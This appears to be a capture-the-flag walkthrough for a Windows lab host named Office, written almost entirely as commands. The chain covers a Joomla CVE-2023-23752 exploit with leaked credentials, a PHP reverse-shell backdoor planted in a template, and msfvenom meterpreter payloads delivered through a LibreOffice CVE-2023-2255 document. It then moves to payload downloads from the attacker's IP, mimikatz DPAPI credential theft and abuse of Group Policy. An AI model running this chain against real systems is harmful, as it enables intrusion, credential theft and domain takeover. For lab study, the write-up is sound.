User Flag  
---------  
Web DB Credential  
-----------------  
It's the vulnerability: Joomla. 4.2.7 -  CVE-2023-23752  
ruby exploit.rb http://{office_ip}  
MysqlDB Name: joomla_db  
User: root  
Password: H0lOgrams4reTakIng0Ver754!  
  
office\web_account  
------------------  
http://{office_ip}/administrator  
Username: administrator  
Password: playboy69  
  
Choose "System" > "Site Templates" in Templates > "Cassiopeia Details and Files" > "index.html" under /templates/cassiopeia/ > Delete the code and replace with php backdoor > Save.  
  
  
Php backdoor  
------------  
> php-reverse-shell.php from "https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php"  
  
> Replace the your ip addres and port for reverse shell in Line 177  
  
  
Reverse shell  
-------------  
> In your terminal > nc -lvnp {you defined port:4444}  
  
> Browse http://{office_ip}/ in the browser  
> Shell pop-up  
  
  
Tstark  
------  
> Download RunasCs.zip from [https://github.com/antonioCoco/RunasCs/r...s/tag/v1.5](https://github.com/antonioCoco/RunasCs/releases/tag/v1.5)  
> Upload RunasCs.exe  
> Python File server command: python -m http.server 80  
> Upload command: cmd /c powershell Invoke-WebRequest -Uri http://{your ip}:80/RunasCs.exe -OutFile C:\Windows\Temp\RunasCs.exe  
  
> C:\Windows\Temp\RunasCs.exe tstark playboy69 "cmd /c type C:\Users\tstark\Desktop\user.txt" -l 8  
  
> You will got user.txt from the tstark account.  
  
  
Root Flag  
----------  
ppotts shell - Libre Vulnerability  
----------------------------------  
> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={your ip} LPORT={new listen port:4445} -f exe -o reverse1.exe  
  
> cmd /c powershell Invoke-WebRequest -Uri http://{your ip}/reverse1.exe -OutFile c:\users\public\reverse1.exe  
> Listen in meterpreter windows/x64/meterpreter/reverse_tcp at your ip & new listen port  
  
> python CVE-2023-2255.py --cmd "c:\users\public\reverse1.exe" --output azerty1.odt  
  
> cmd /c powershell Invoke-WebRequest -Uri http://{your ip}/azerty1.odt -OutFile C:\xampp\htdocs\internal\applications\azerty1.odt  
  
> Wait for a while in msfconsole and You will got session as ppotts user.  
  
  
hhogan shell  
------------  
> vaultcmd /listcreds:"Windows Credentials" /all > you can see that you can get office\hhogan credential  
  
> Download "mimmikatz_trunk.zip" from [https://github.com/gentilkiwi/mimikatz/r...0-20220919](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919)  
  
> Upload x64/mimikatz.exe to the user ppotts shell  
  
> cmd /c powershell Invoke-WebRequest -Uri http://{your ip}/mimikatz.exe -OutFile C:\Users\ppotts\Desktop\mimikatz.exe  
  
> dir /a:h C:\Users\ppotts\AppData\Roaming\Microsoft\Credentials\  
> Note three results as Credential_A, Credential_B, Credential_C  
  
> dir /a:h C:\Users\ppotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\  
> Note the first two random no as Protect_A, Protect_B  
  
> .\mimikatz.exe - Case Study Link [https://github.com/gentilkiwi/mimikatz/w...redentials](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)  
  
> dpapi::masterkey /in:C:\Users\ppotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\{Protect_B-191d3f9d-7959-4b4d-a520-a444853c47eb} /rpc  
> Eg: dpapi::masterkey /in:C:\Users\ppotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\10811601-0fa9-43c2-97e5-9bef8471fc7d /rpc  
  
> dpapi::cache  
  
> dpapi::cred /in:"%appdata%\Microsoft\Credentials\{Credential_A_18A1927A997A794B65E9849883AC3F3E}"  
> dpapi::cred /in:"%appdata%\Microsoft\Credentials\{Credential_B_84F1CAEEBF466550F4967858F9353FB4}"  
> dpapi::cred /in:"%appdata%\Microsoft\Credentials\{Credential_C_E76CCA3670CD9BB98DF79E0A8D176F1E}"  
> Eg: dpapi::cred /in:"%appdata%\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4"  
  
> You will get office\HHogan credential: H4ppyFtW183#  
  
  
Administartor  
-------------  
> evil-winrm -i {office ip} -u hhogan -p H4ppyFtW183#  
> Executing the commands in hhogan shell is too slow, you should consider new meterpreter reverse shell with msfvenom  
  
> Download "SharpView.exe" from [https://github.com/tevora-threat/SharpVi...r/Compiled](https://github.com/tevora-threat/SharpView/tree/master/Compiled)  
> Upload "SharpView.exe" to hhogan shell  
> cmd /c powershell Invoke-WebRequest -Uri http://{your ip}/SharpView.exe -OutFile C:\Users\hhogan\Desktop\SharpView.exe  
  
> .\SharpView.exe Get-DomainGPO -Properties displayName  
> The only GroupPolicy Name which is vulnerable is "Default Domain Controllers Policy"  
  
> Download "SharpGPOAbuse.exe" from [https://github.com/byronkg/SharpGPOAbuse...es/tag/1.0](https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0) and upload it to the hhogan shell  
> cmd /c powershell Invoke-WebRequest -Uri http://{your ip}/SharpGPOAbuse.exe -OutFile C:\Users\hhogan\Desktop\SharpGPOAbuse.exe  
  
> .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c type C:\Users\Administrator\Desktop\root.txt > C:\Users\tstark\Desktop\root.txt" --GPOName "Default Domain Controllers Policy"  
> gpupdate /force  
  
> Upload "RunasCs.exe" to the shell  
> cmd /c powershell Invoke-WebRequest -Uri http://{your ip}/RunasCs.exe -OutFile C:\Users\hhogan\Desktop\RunasCs.exe  
> C:\Users\HHogan\Desktop\RunasCs.exe tstark playboy69 "cmd /c type C:\Users\tstark\Desktop\root.txt" -l 8  
  
> You got the root flag.